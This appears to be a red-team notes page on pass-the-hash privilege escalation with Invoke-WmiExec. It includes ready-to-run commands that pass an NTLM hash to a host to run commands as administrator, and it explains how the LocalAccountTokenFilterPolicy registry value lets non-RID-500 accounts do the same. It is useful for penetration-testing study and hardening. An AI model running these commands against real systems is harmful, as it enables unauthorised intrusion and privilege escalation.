# Pass The Hash: Privilege Escalation with Invoke-WMIExec

## Execution

If you have an NTLMv2 hash of a local administrator on a box ws01, it's possible to pass that hash and execute code with privileges of that local administrator account:

```csharp
Invoke-WmiExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username administrator -command hostname
```

Below shows how the user `low` is not a local admin, passes the hash of the local `administrator` account on ws01 and executes a command successfully:

![](../../.gitbook/assets/image%20%28214%29.png)

## RID != 500 - No Pass The Hash for You

Say you have a hash of the user spotless who you know is a local admin on ws01:

![](../../.gitbook/assets/image%20%2811%29.png)

...but when you attempt passing the hash, you get access denied - why is that?

![](../../.gitbook/assets/image%20%28177%29.png)

It may be because hashes for accounts that are not RID=500 \(not default administrator accounts\) are stripped of some privileges during the token creation.

![](../../.gitbook/assets/image%20%28235%29.png)

![](../../.gitbook/assets/image%20%2882%29.png)

If the target system you are passing the hash to, has the following registry key/value/data set to 0x1, pass the hash will work even for accounts that are not RID 500:

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

![](../../.gitbook/assets/image%20%2846%29.png)

```csharp
Invoke-WmiExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username spotless -command hostname
```

![](../../.gitbook/assets/image%20%2841%29.png)

## References

{% embed url="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" %}

